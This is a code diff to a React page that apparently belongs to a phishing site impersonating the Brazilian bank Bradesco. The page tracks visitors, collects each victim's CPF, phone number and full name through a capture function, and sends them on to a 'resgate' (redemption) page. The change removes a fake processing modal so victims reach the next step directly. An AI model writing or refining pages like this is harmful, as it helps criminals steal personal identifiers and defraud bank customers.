@@ -2,7 +2,6 @@ import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Menu, Bell } from "lucide-react";
 import AttentionModal from "@/components/AttentionModal";
-import ProcessingModal from "@/components/ProcessingModal";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import BottomNav from "@/components/BottomNav";
 import { supabase } from "@/integrations/supabase/client";
@@ -12,7 +11,6 @@ const Index = () => {
   useVisitorTracking("index");
   const navigate = useNavigate();
   const [modalOpen, setModalOpen] = useState(true);
-  const [processingOpen, setProcessingOpen] = useState(false);
   const [toggleOn, setToggleOn] = useState(false);
   const [cpf, setCpf] = useState("");
   const [telefone, setTelefone] = useState("");
@@ -121,7 +119,7 @@ const Index = () => {
 
         {/* CTA */}
         <button
-          onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); setProcessingOpen(true); }}
+          onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); navigate("/resgate", { state: { nome: nomeCompleto } }); }}
           disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
           className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
         >
@@ -137,13 +135,6 @@ const Index = () => {
         open={modalOpen}
         onClose={() => setModalOpen(false)}
         onContinue={() => setModalOpen(false)}
-      />
-
-      {/* Processing Modal */}
-      <ProcessingModal
-        open={processingOpen}
-        userName={nomeCompleto}
-        onComplete={() => { setProcessingOpen(false); navigate("/resgate", { state: { nome: nomeCompleto } }); }}
       />
     </div>
   );
